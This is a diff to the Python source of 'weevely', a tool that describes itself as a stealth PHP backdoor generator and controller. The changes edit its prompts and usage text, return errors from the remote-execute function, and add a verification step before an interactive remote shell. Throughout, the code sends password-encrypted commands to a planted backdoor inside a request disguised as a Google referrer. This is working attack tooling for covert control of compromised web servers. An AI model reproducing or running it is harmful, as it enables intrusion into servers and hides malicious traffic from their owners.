@@ -73,7 +73,9 @@ class weevely:
 	  sys.exit(1)
 
       if 'pwd' not in locals():
-	print "+ A short random password with alphanumeric characters (like 'a33k44') is less detectable.\n+ Please insert the password: ",
+	if mode=='g':
+	  print "+ Random alphanumeric password (like 'a33k44') are less detectable."
+	print "+ Please insert password: ",
 	pwd = sys.stdin.readline()
 
 	
@@ -89,19 +91,17 @@ class weevely:
       sys.exit(1)
 
   def usage(self):
-    print """
-+  Generate backdoor code with <password> in <filepath>.
+    print """+  Generate backdoor code in <filepath>, using <password>.
 +  	./weevely -g -o <filepath> -p <password>
 +      
-+  Execute single remote command via <url>, using <password>.
++  Execute remote <command> via <url>, using <password>.
 +  	./weevely -c <command> -u <url> -p <password>
 +      
 +  Execute remote terminal via <url>, using <password>.
-+  	./weevely -t -u <url> -p <password>
-"""
++  	./weevely -t -u <url> -p <password>"""
     
   def banner(self):
-    print "+ weevely - stealth PHP backoor generator/controller.\n+\t\t\t\t\tEmilio Pinna & Carlo Satta."
+    print "+ Weevely - stealth PHP backoor generator and controller.\n+\t\t\tEmilio Pinna & Carlo Satta.\n+"
 
      
   def crypt(self, text, key):
@@ -117,12 +117,13 @@ class weevely:
     return toret 
 
   def execute(self, url, pwd, cmnd, mode):
+    cmnd=cmnd.strip()
     cmdstr=self.crypt(cmnd,pwd)
     refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
     try: 
       ret=self.execHTTPGet(refurl,url)
     except urllib2.URLError, e:
-      print '- Error: ' + str(e.reason)
+      return str(e.reason)
     else: 
       restring='<' + pwd + '>(.*)</' + pwd + '>'
       e = re.compile(restring,re.DOTALL)
@@ -135,12 +136,18 @@ class weevely:
     return r.read()
     
   def terminal(self, url, pwd, mode):
-    while True:
-      print "exec> ",
-      cmnd = sys.stdin.readline()
-      if cmnd!='\n':
-	self.execute(url, pwd, cmnd, mode)
-	
+    print '+ Backdoor verification...',
+    ret = self.execute(url, pwd, "echo " + pwd, mode)
+    if (ret is not pwd):
+      print 'failed: ' + ret
+    else:	
+      print 'succeeded.' 
+      while True:
+	print "> ",
+	cmnd = sys.stdin.readline()
+	if cmnd!='\n':
+	  self.execute(url, pwd, cmnd, mode)
+	  
   def generate(self,key,path):
     print self.crypt(back,key)
     
